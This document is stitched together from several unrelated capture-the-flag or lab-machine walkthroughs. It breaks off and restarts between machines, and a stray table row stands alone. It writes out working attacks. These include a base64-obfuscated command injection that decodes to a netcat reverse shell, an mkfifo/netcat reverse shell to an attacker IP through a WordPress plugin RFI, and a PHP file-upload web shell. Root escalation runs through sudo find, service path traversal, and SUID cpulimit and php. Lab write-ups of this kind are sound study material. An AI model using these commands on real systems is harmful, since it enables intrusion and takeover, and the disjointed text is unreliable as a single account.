Directories/files listed &rarr;

- index.php
- icons/
- superadmin.php

### Exploitation

Looking at `superadmin.php`, it seems like a ping command and thus may be vulnerable to command injection. Using `;` didn't work, neither did `&&`. `|` did work and using it to print the code of the file like `127.0.0.1 | cat superadmin.php` shows that `";","&&","/","bin","&"," &&","ls","nc","dir","pwd"` are all blocked.

Therefore, escaping the blocks by using

```
127.0.0.1 | `echo bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMjI1IDMwMDIK | base64 -d`
```

This gives a shell as the `www-data` user and thus the user flag.

### Privilege Escalation

#### User

Looking at the `/etc/passwd` file, the users of importance are `root`, `haclabs` and `yash`. Used `find / -type f -user yash 2>/dev/null` to list files owned by `yash` and this prints a file `/usr/share/hidden/.passwd`. Looking at the permissions, it is world readable.

The contents of the file is a password `haclabs1234`. This works for the credentials `haclabs:haclabs1234`. This grants a shell as `haclabs` user. Looking at `sudo -l`, this user can run `/usr/bin/find` as root without any password. Thus, using the command `sudo find . -exec /bin/bash \; -quit`, a root shell can be gained. This gives the root flag.

Repeating a scan for the `/wordpress/` subdirectory, the following were listed &rarr;

- index.php (301)
- wp-content/
- wp-login.php
- license.txt
- wp-includes/
- readme.html
- wp-trackback.php
- wp-admin (302, to wp-login.php)

WPScan was also run given the presence of the wordpress site. This revealed the following findings &rarr;

- Plugin Social Warfare 3.5.0 (out of date)
- Plugin Simple Cart Solution 0.2.0 (out of date)
- Theme twentynineteen 1.6 (out of date)
- Wordpress version 5.4.2
- Enabled WP-Cron at /wordpress/wp-cron.php
- Directory listing at /wordpress/wp-content/uploads/
- XMLRPC enabled at /xmlrpc.php

### Exploitation

#### RFI and RCE

With all the information above, the first searchsploit result is that of an RCE in Social Warfare versions < 3.5.3. Looking at the exploit, it needs a payload url to know the payload (an RFI). This will be included in `/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=<RFI_URL>`.

#### Reverse Shell

Visiting this page would give the result of the command in the payload url. The payload must be of the form &rarr; `<pre>system('whoami')</pre>`. Checking the existence of netcat and bash, a new payload can be used for a reverse shell &rarr; `nc -e /bin/bash 192.168.49.244 3002`. This didn't work, therefore, used the usual bash payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.244 3002 >/tmp/f`. This grants the shell as `www-data` user.

### Privilege Escalation

#### User 1

Looking at `/etc/passwd`, the users of interest are `root`, `max` and `steven`. The home directory of both `max` and `steven` are readable by `www-data`. The user flag is in `max`'s home directory. The webroot also contains a base32 encoded string in a file `mybackup.txt` &rarr; `JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF`.

This decodes to `I have to keep this password somewhere safely because I can't remember it: opensesame`. Therefore, this password is attempted on ssh for `max` and `steven`. However, this did not work.

The home directory of `max` also has a `.ssh` directory, which contains the private key of `max`. This is readable by `www-data` and is thus used to ssh into the server as `max`, which grants the shell and thus the user flag as well.

#### User 2

Checked the ability of `max` to run `sudo` using `sudo -l`. This allowed running `/usr/sbin/service` as `steven` without a password. The `service` command looks for services in a specific directory and launches them. It can therefore be tricked by prepending `../../../../` to whichever command needs to be executed. Therefore running &rarr;

```
sudo -u steven /usr/sbin/service ../../../../bin/bash
```

grants the shell as `steven`.

#### Root

Looked at the ability of `steven` to run `sudo`. This revealed that `steven` is allowed to run `/opt/tools/server-health.sh` as `root` without a password. The path does not exist, therefore, a new executable is created with the same name and the following content &rarr;

```
##!/bin/bash
bash -p
```

Then command `sudo /opt/tools/server-health.sh` is executed, which grants the shell as root and also the root flag.

| 61000    | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |

### Exploitation

Looking at the anonymous ftp, there was a directory `.hannah` inside which was an ssh key. Used this key for the user `hannah` on the ssh server grants the shell as `hannah`. This gave the user flag.

### Privilege Escalation

Looked at the setuid binaries on the system, `cpulimit` was the interesting one. It can be ised to spawn a shell with elevated privileges using command &rarr; `cpulimit -l 50 -f /bin/bash`. However, with this, the program detects that the program being run has lower privileges, so bash drops the elevated privileges. Usually, bash has a flag `-p`, the purpose of which, as stated in the man page of bash is &rarr;

```
If  the  shell is started with the effective user (group) id not equal to the
real user (group) id, and the -p option is not supplied, the effective user id
is set to the real user id. Otherwise, the effective user id is not reset.
```

Therefore, a privileged shell can be launched as follows &rarr; `cpulimit -l 100 -f -- /bin/sh -p`. This gives the root shell and thus, the root flag.

Scanning the web site on port 8000 with a `-x html,php,txt` and a `-f` flag gives the following &rarr; 

- app/

- index/
- set/

Running nmap to discover shares using `nmap --script smb-enum-shares -p 139,445 192.168.59.76` provided with the shares of `IPC`, `sambashare`, and `print`. This also showed the capability to read and write using anonymous users and a possible username of `agi`.

### Exploitation

Listing Samba shares using `sambaclient -U '' //192.168.59.76/sambashare`. This share had an email to user `daisa` and a backup of a wordpress site. The email contained a hint to a possible password for `daisa`, using that on the website at the `/admin` path for the website at port 8000 provided access with credentials `daisa:babygirl`.

Here, the Library segment contains a file upload functionality that is interesting. Image files can be uploaded and can be previewed in the application. Messing with this functionality to upload a PHP code by changing the `Content-Type` to `application/php` and the filename to include the `.php` extension with the data containing the following code &rarr; 

```php
<?php
echo("hacked");
?>
```

This file can be uploaded without any issue which means the server is vulnerable to arbitrary file upload. The preview for this php file doesn’t work of course, but the application shows a “Download File” option due to the failed preview. This button contains a link to the file at `http://192.168.59.76:8000/storage/originals/50/ce/cyberpunk.php`, upon visiting which the string “hacked” is displayed on the web page indicating that arbitrary php can be executed. Therefore, Pentest Monkey’s script can be used to obtain a reverse shell.

Using the script and then executing the PHP code at `http://192.168.59.76:8000/storage/originals/ec/a3/cyberpunk-shell.php` grants a shell with the user `www-data`.

### Privilege Escalation

Looking at the SUID binaries using `find / -perm -4000 2>/dev/null` there is an SUID binary for `php7.2` which does have a root shell escalation associated with it. Using `php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"` to launch a shell with effective uid as root, the root flag and the local flag can be read. A new user with full sudo permissions can also be added by modifying the `/etc/passwd` and `/etc/sudoers` files.
